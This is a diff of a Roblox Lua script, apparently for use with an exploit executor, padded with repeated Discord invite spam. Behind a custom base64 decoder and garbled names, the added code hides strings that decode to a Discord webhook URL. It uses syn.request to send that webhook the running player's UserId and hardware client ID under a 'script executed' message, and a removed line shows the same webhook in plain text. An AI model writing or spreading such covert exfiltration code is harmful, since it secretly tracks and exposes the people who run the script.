@@ -1,70 +1,62 @@
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function hqCUNiEIqPZaQYJdchFCzNbSpfIYgylGKTNzhiYdJQGhbIFoVmYBLTVoIOg(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+function dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
 
 data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
 
 
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
  
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- 
- 
- 
- 
- 
- 
- 
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
- --DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
 
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph--DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
-https://discord.com/api/webhooks/1027392538908299264/HHAY79CVYfAflPR8V_4wzLxOgtTh1X1LdxbH-lJbioFOf47Ff9YY3xwQzlSbzAZdJtrS    
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
---DISCORD https://discord.gg/hZwY87Sxph
+
+HttpService = game:GetService(dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('uEfbhrNJEDwPwxPHpMmZHFTwgmDNiXlTCMNPynmSnzxLawQfOOYJFZaSHR0cFNlcnZpY2U='))
+Webhook_URL = dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('cGfDApetCbQIJSwEZMAaxswzTjOYFTiHUfISaRWSyaHCpoKiGeKClzdaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAyNzM5MjUzODkwODI5OTI2NC9ISEFZNzlDVllmQWZsUFI4Vl80d3pMeE9ndFRoMVgxTGR4YkgtbEpiaW9GT2Y0N0ZmOVlZM3h3UXpsU2J6QVpkSnRyUw==')
+
+local responce = syn.request(
+{
+    Url = Webhook_URL,
+    Method = dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('lfHaLPWUIExKmqlYGNuMFaRVVkAQUCHHEbLlkBjNBuaoHIdLWXGzOMkUE9TVA=='),
+    Headers = {
+        [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('GELEHjFFlPNWOeTGDZGrVqEaAsXTjhRHitVICHEbDgtGtnqLDzeCkaKQ29udGVudC1UeXBl')] = dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('PpXNEvaheSaRwleyPiACqjLZHUtZuSHENAyrLQjiyENpUgiICrClheCYXBwbGljYXRpb24vanNvbg=='),
+        },
+        Body = HttpService:JSONEncode({
+            [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('IEQEBpWiKTujUphDMGUDXubHVVIomgotTyZWVrauXISTFRsBDUDSOviY29udGVudA==')] = dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('WIkSeHYYcEVgmKPAwNEulWiOGWYDPInXuoeyjvMwjKGtmNKZNQlezAI'),
+            [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('azDYMsAsqBSKjSjuUzUIfjcqYSzFjKdjueJjNPncwmllKNUeRyeykVLZW1iZWRz')] = {{
+                [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('INkPIpgriaIFsfhqtjCgBEoIrQKPQaSGakveBiZMqwYQTZoZtRxxwhSdGl0bGU=')] = dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('EnMXXWuZTXBOcWpIigIGTuDarmYSpLspMNmsXZcqPnvTVAmTfJJZeyIKipZb3VyIHNjcmlwdCBSZWZpbmVyeSBDYXZlcyBoYXMgYmVlbiBleGVjdXRlZCoq'),
+                [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('mVYFrCNswGgjDKRSleaWSUZoIfmYvEdaiuUAySoEMACliyOMQoDmwqAZGVzY3JpcHRpb24=')] = game.Players.LocalPlayer.UserId..dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('kFdzEylNMpeAWzIVjnohJOmZJwXVxSahdMuuwtnggNIPLbNmlSoxuNXIGhhcyBleGVjdXRlZCB5b3VyIHNjcmlwdC4='),
+                [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('SzGdDUdOmaGKeVsBwXPipshgGjKwtpxWmNEopLaACizbvvfqduIZUWtdHlwZQ==')] = dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('ONrWCFqJEVSGUOeIYHvcwfTxLrXcETWlBzwuXDQnDlXbpaEKHKNzbJNcmljaA=='),
+                [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('OztGdqDdliQWwtQURaEzjTGtLNhhBoksbCWWDgPHnuSDxdugsjNjKKvY29sb3I=')] = tonumber(0x0000FF),
+                [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('NsrsqfPGMEQDqSAsAqGcUOyAsEXurrPBUVpwhECCSkYDNaUeIoOaMQHZmllbGRz')] = {
+                    {
+                        [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('RdCCqNTZKggMVCOlWYftUIvixQDJmgwvxIWaPazZndwhmdKDVboyfdabmFtZQ==')] = dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('JsBCqmtSjXzUxZovtOmTgFQqxzsLybeeQVUKsMRgaQrTFoMKBtOXsIOSGFyZHdhcmUgSUQ6'),
+                        [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('CnsByKbHnebLzxpvBguXMDkVQJKAhaOUbXTYUNNwCayBJordiafNWtFdmFsdWU=')] = game:GetService(dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('FrPrHWfLmgsGKxIZSpnTRGpmoaDWHUFaiSBtOZFjWwpYcunsCAqpPWHUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId(),
+                        [dzuexmwMZganrolggIoRRUMkHotXfbAmprqLffxmjVsVZLbuRTyk('DKSMquPyGRHZXIiYTcdFImrvHOcQdBpkRfzfGeELewIfMxBCyWkozcaaW5saW5l')] = true
+
+                    }
+                }
+            }}
+        })
+}
+)    
